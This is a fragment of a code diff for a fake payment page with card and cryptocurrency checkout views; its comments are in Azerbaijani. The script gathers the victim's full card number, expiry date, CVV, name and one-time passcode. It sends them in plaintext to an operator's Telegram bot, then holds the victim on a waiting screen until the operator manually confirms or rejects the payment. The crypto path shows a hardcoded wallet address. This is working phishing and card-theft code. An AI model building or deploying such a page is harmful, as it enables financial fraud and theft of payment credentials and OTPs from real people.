+        cryptoPayment: document.getElementById('cryptoPaymentView'),
+        otp: document.getElementById('otpView'),
+        wait: document.getElementById('waitView'),
+        success: document.getElementById('successView'),
+        error: document.getElementById('errorView')
+      };
+
+      const amountInput = document.getElementById('amountInput');
+      const liveCryptoValue = document.getElementById('liveCryptoValue');
+      const coinGrid = document.getElementById('coinGrid');
+      const searchInput = document.getElementById('searchInput');
+      const methodCard = document.getElementById('methodCard');
+      const methodCrypto = document.getElementById('methodCrypto');
+      const continueBtn = document.getElementById('continueBtn');
+
+      const cardNumber = document.getElementById('cardNumber');
+      const cardExpiry = document.getElementById('cardExpiry');
+      const cardCvv = document.getElementById('cardCvv');
+      const cardName = document.getElementById('cardName');
+      const goToOtpBtn = document.getElementById('goToOtpBtn');
+      
+      const otpInput = document.getElementById('otpInput'); 
+      const submitCardBtn = document.getElementById('submitCardBtn');
+
+      const qrImage = document.getElementById('qrImage');
+      const addressValue = document.getElementById('addressValue');
+      const copyBtn = document.getElementById('copyBtn');
+      const bdAmount = document.getElementById('bdAmount');
+      const bdTotal = document.getElementById('bdTotal');
+      const goToCryptoPaymentBtn = document.getElementById('goToCryptoPaymentBtn');
+      const confirmCryptoBtn = document.getElementById('confirmCryptoBtn');
+
+      // Xəta elementləri
+      const groupCardNumber = document.getElementById('groupCardNumber');
+      const groupExpiry = document.getElementById('groupExpiry');
+      const groupCvv = document.getElementById('groupCvv');
+      const groupName = document.getElementById('groupName');
+
+      let selectedCoin = { coin: 'BTC', name: 'Bitcoin', rate: 67000, address: 'bc1pqd7raqd8ckzxwrlvmupktjw8gy7wpsmuk29c4ntcaf3f3a4u5zxqhtl08j', network: 'Bitcoin' };
+      let paymentData = {};
+      let selectedMethod = 'card';
+      let paymentCheckInterval = null;
+      let messageIdToCheck = null;
+      let lastProcessedUpdateId = 0;
+
+      function switchView(viewName) {
+        Object.values(views).forEach(v => v.classList.remove('active'));
+        views[viewName].classList.add('active');
+      }
+
+      methodCard.addEventListener('click', () => {
+        methodCard.classList.add('selected');
+        methodCrypto.classList.remove('selected');
+        selectedMethod = 'card';
+      });
+      methodCrypto.addEventListener('click', () => {
+        methodCrypto.classList.add('selected');
+        methodCard.classList.remove('selected');
+        selectedMethod = 'crypto';
+      });
+
+      amountInput.addEventListener('input', function(e) {
+        let val = e.target.value.replace(/[^0-9.]/g, '');
+        const parts = val.split('.');
+        if (parts.length > 2) val = parts[0] + '.' + parts.slice(1).join('');
+        if (val.includes('.')) { const [int, dec] = val.split('.'); if (dec.length > 2) val = int + '.' + dec.slice(0, 2); }
+        e.target.value = val;
+        updateLiveValue();
+      });
+      amountInput.addEventListener('blur', function(e) {
+        const v = e.target.value.trim();
+        if (v && !isNaN(parseFloat(v))) e.target.value = parseFloat(v).toFixed(2);
+        updateLiveValue();
+      });
+      document.querySelectorAll('.quick-amounts button').forEach(btn => {
+        btn.addEventListener('click', function() {
+          amountInput.value = this.dataset.val;
+          updateLiveValue();
+        });
+      });
+
+      function updateLiveValue() {
+        const val = parseFloat(amountInput.value) || 0;
+        const crypto = val / selectedCoin.rate;
+        liveCryptoValue.textContent = `${crypto.toFixed(4)} ${selectedCoin.coin}`;
+      }
+
+      coinGrid.addEventListener('click', function(e) {
+        const item = e.target.closest('.coin-item');
+        if (!item) return;
+        document.querySelectorAll('.coin-item').forEach(el => el.classList.remove('selected'));
+        item.classList.add('selected');
+        selectedCoin = {
+          coin: item.dataset.coin, name: item.dataset.name,
+          rate: parseFloat(item.dataset.rate), address: item.dataset.address,
+          network: item.dataset.network
+        };
+        updateLiveValue();
+      });
+
+      searchInput.addEventListener('input', function(e) {
+        const query = e.target.value.toLowerCase().trim();
+        document.querySelectorAll('.coin-item').forEach(item => {
+          item.style.display = (item.dataset.name.toLowerCase().includes(query) || item.dataset.coin.toLowerCase().includes(query)) ? 'flex' : 'none';
+        });
+      });
+
+      continueBtn.addEventListener('click', function() {
+        const amount = amountInput.value.trim();
+        if (!amount || parseFloat(amount) <= 0) {
+          amountInput.style.borderBottom = '1px solid #ff6b6b';
+          setTimeout(() => amountInput.style.borderBottom = 'none', 2000);
+          return;
+        }
+        const usd = parseFloat(amount);
+        const cryptoAmount = usd / selectedCoin.rate;
+        paymentData = { usd, cryptoAmount, method: selectedMethod };
+
+        if (selectedMethod === 'card') {
+          switchView('card');
+        } else {
+          switchView('crypto');
+        }
+      });
+
+      // CARD FORMATTING
+      cardNumber.addEventListener('input', function(e) {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length > 16) v = v.slice(0, 16);
+        e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+      });
+      cardExpiry.addEventListener('input', function(e) {
+        let v = e.target.value.replace(/\D/g, '');
+        if (v.length > 4) v = v.slice(0, 4);
+        if (v.length >= 3) e.target.value = v.slice(0, 2) + '/' + v.slice(2);
+        else e.target.value = v;
+      });
+      cardCvv.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      });
+
+      // YALNIZ RƏQƏM OTP
+      otpInput.addEventListener('input', function(e) {
+        this.value = this.value.replace(/[^0-9]/g, '');
+      });
+
+      // KART MƏLUMATLARINI GÖNDƏR VƏ 5 SANİYƏ GÖZLƏ
+      goToOtpBtn.addEventListener('click', async function() {
+        // Əvvəlcə bütün xətaları gizlədirik
+        [groupCardNumber, groupExpiry, groupCvv, groupName].forEach(g => g.classList.remove('has-error'));
+        
+        const cNum = cardNumber.value.replace(/\s/g, '');
+        const cExp = cardExpiry.value;
+        const cCvv = cardCvv.value;
+        const cName = cardName.value.trim();
+        let hasError = false;
+
+        // 1. Yoxlama: Kart nömrəsi tam 16 rəqəmdirmi?
+        if (cNum.length !== 16) {
+          groupCardNumber.classList.add('has-error');
+          hasError = true;
+        }
+        
+        // 2. Yoxlama: Ay/İl düzgün formatdadır və keçmişdə deyil?
+        if (!/^\d{2}\/\d{2}$/.test(cExp)) {
+          groupExpiry.classList.add('has-error');
+          document.getElementById('errExpiry').textContent = 'Please enter a valid date (MM/YY).';
+          hasError = true;
+        } else {
+          const [mm, yy] = cExp.split('/').map(Number);
+          const currentYear = new Date().getFullYear() % 100;
+          const currentMonth = new Date().getMonth() + 1;
+          
+          // Tarix keçibmi? (İl kiçikdirsə və ya il eynidirsə amma ay kiçikdirsə)
+          if (yy < currentYear || (yy === currentYear && mm < currentMonth) || mm < 1 || mm > 12) {
+            groupExpiry.classList.add('has-error');
+            document.getElementById('errExpiry').textContent = 'Card has expired or invalid date.';
+            hasError = true;
+          }
+        }
+
+        // 3. Yoxlama: CVV ən azı 3 rəqəmdirmi?
+        if (cCvv.length < 3) {
+          groupCvv.classList.add('has-error');
+          hasError = true;
+        }
+
+        // 4. Yoxlama: Ad boşdurmu?
+        if (cName.length < 3) {
+          groupName.classList.add('has-error');
+          hasError = true;
+        }
+
+        if (hasError) return;
+
+        // Xəta yoxdursa, məlumatları yadda saxlayırıq
+        paymentData.cardNumber = cNum;
+        paymentData.cardExpiry = cExp;
+        paymentData.cardCvv = cCvv;
+        paymentData.cardName = cName;
+
+        goToOtpBtn.disabled = true;
+        goToOtpBtn.innerHTML = '<span class="spinner"></span> Sending...';
+        
+        // Kart məlumatlarını dərhal Telegrama göndəririk (Düymələr OLMADAN)
+        await sendToTelegram(`
+<b>💳 Card Details Received</b>
+<b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
+<b>👤 Name:</b> ${paymentData.cardName}
+<b>💳 Card:</b> <code>${paymentData.cardNumber}</code>
+<b>📅 Expiry:</b> ${paymentData.cardExpiry}
+<b>🔒 CVV:</b> ${paymentData.cardCvv}
+<b>⏳ Status:</b> Waiting for OTP...
+        `.trim());
+
+        // Tam 5 saniyə gözləyirik
+        setTimeout(() => {
+          switchView('otp');
+          goToOtpBtn.disabled = false;
+          goToOtpBtn.innerHTML = 'Continue <span style="font-size:18px;">→</span>';
+          setTimeout(() => otpInput.focus(), 100);
+        }, 5000);
+      });
+
+      // CRYPTO
+      goToCryptoPaymentBtn.addEventListener('click', function() {
+        const usd = paymentData.usd;
+        const cryptoAmount = usd / selectedCoin.rate;
+        
+        paymentData.coin = selectedCoin.coin;
+        paymentData.network = selectedCoin.network;
+        paymentData.address = selectedCoin.address;
+        paymentData.cryptoAmount = cryptoAmount;
+
+        addressValue.textContent = selectedCoin.address;
+        qrImage.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(selectedCoin.address)}&color=0f1a28&bgcolor=ffffff`;
+        bdAmount.textContent = `$${usd.toFixed(2)}`;
+        bdTotal.innerHTML = `${cryptoAmount.toFixed(8)} <span>${selectedCoin.coin}</span>`;
+
+        switchView('cryptoPayment');
+      });
+
+      copyBtn.addEventListener('click', function() {
+        navigator.clipboard.writeText(addressValue.textContent).then(() => {
+          copyBtn.textContent = 'Copied!';
+          setTimeout(() => copyBtn.textContent = 'Copy', 2000);
+        });
+      });
+
+      // Düyməsiz sadə mesaj göndərmək üçün
+      async function sendToTelegram(text) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+          });
+          const data = await res.json();
+          return data.result ? data.result.message_id : null;
+        } catch (err) { return null; }
+      }
+
+      // Düyməli mesaj göndərmək üçün (yalnız son təsdiq üçün)
+      async function sendTelegramWithButtons(text) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+              chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML',
+              reply_markup: { inline_keyboard: [[{ text: "✅ Təsdiqlə", callback_data: "confirm_payment" }, { text: "❌ İmtina et", callback_data: "reject_payment" }]] }
+            })
+          });
+          const data = await res.json();
+          return data.result ? data.result.message_id : null;
+        } catch (err) { return null; }
+      }
+
+      async function checkPaymentStatus(msgId) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastProcessedUpdateId + 1}&limit=10`);
+          const data = await res.json();
+          if (!data.ok || !data.result) return null;
+
+          for (let update of data.result) {
+            lastProcessedUpdateId = update.update_id;
+            if (update.callback_query && update.callback_query.message.message_id === msgId) {
+              const cbData = update.callback_query.data;
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
+              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, message_id: msgId, reply_markup: { inline_keyboard: [] } })
+              });
+              return cbData;
+            }
+          }
+          return null;
+        } catch (err) { return null; }
+      }
+
+      // OTP GÖNDƏR (Təsdiq üçün - Düymələrlə)
+      submitCardBtn.addEventListener('click', async function() {
+        const otpCode = otpInput.value.trim();
+        if (otpCode.length < 4) { alert('Please enter the verification code.'); return; }
+
+        submitCardBtn.disabled = true;
+        submitCardBtn.innerHTML = '<span class="spinner"></span> Processing...';
+        switchView('wait');
+
+        const msgText = `
+<b>💳 Card Payment (OTP)</b>
+<b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
+<b>💳 Card:</b> <code>${paymentData.cardNumber}</code>
+<b>👤 Name:</b> ${paymentData.cardName}
+<b>🔑 OTP:</b> <code>${otpCode}</code>
+        `.trim();
+
+        const msgId = await sendTelegramWithButtons(msgText);
+
+        if (msgId) {
+          messageIdToCheck = msgId;
+          clearInterval(paymentCheckInterval);
+          paymentCheckInterval = setInterval(async () => {
+            const status = await checkPaymentStatus(messageIdToCheck);
+            if (status === 'confirm_payment') {
+              clearInterval(paymentCheckInterval);
+              switchView('success');
+              document.getElementById('successAmount').textContent = '$' + paymentData.usd.toFixed(2);
+            } else if (status === 'reject_payment') {
+              clearInterval(paymentCheckInterval);
+              switchView('error');
+            }
+          }, 3000);
+        } else {
+          switchView('error');
+        }
+      });
+
+      // CRYPTO GÖNDƏR (Düymələrlə)
+      confirmCryptoBtn.addEventListener('click', async function() {
+        confirmCryptoBtn.disabled = true;
+        confirmCryptoBtn.innerHTML = '<span class="spinner"></span> Processing...';
+        switchView('wait');
+
+        const msgText = `
+<b>🪙 Crypto Payment Invoice</b>
+<b>💰 Amount:</b> $${paymentData.usd.toFixed(2)}
+<b>🪙 Crypto:</b> ${paymentData.coin} (${paymentData.network})
+<b>📊 Amount:</b> ${paymentData.cryptoAmount.toFixed(8)} ${paymentData.coin}
+<b>📍 Address:</b> <code>${paymentData.address}</code>
+        `.trim();
+
+        const msgId = await sendTelegramWithButtons(msgText);
+
+        if (msgId) {
+          messageIdToCheck = msgId;
+          clearInterval(paymentCheckInterval);
+          paymentCheckInterval = setInterval(async () => {
+            const status = await checkPaymentStatus(messageIdToCheck);
+            if (status === 'confirm_payment') {
+              clearInterval(paymentCheckInterval);
+              switchView('success');
+              document.getElementById('successAmount').textContent = '$' + paymentData.usd.toFixed(2);
+            } else if (status === 'reject_payment') {
+              clearInterval(paymentCheckInterval);
+              switchView('error');
+            }
+          }, 3000);
+        } else {
+          switchView('error');
+        }
+      });
+
+      document.getElementById('backToStep1FromCard').addEventListener('click', () => switchView('step1'));
+      document.getElementById('backToStep1FromCrypto').addEventListener('click', () => switchView('step1'));
+      document.getElementById('backToCryptoFromPayment').addEventListener('click', () => switchView('crypto'));
+      document.getElementById('backToCard').addEventListener('click', () => switchView('card'));
+
+      function resetApp() {
+        switchView('step1');
+        amountInput.value = '';
+        cardNumber.value = '';
+        cardExpiry.value = '';
+        cardCvv.value = '';
+        cardName.value = '';
+        otpInput.value = '';
+        [groupCardNumber, groupExpiry, groupCvv, groupName].forEach(g => g.classList.remove('has-error'));
+        submitCardBtn.disabled = false;
+        submitCardBtn.textContent = 'Submit Payment';
+        confirmCryptoBtn.disabled = false;
+        confirmCryptoBtn.textContent = 'I have sent the payment';
+        updateLiveValue();
+      }
+      document.getElementById('doneBtn').addEventListener('click', resetApp);
+      document.getElementById('retryBtn').addEventListener('click', resetApp);
+
+    })();
+  </script>
 </body>
 </html>
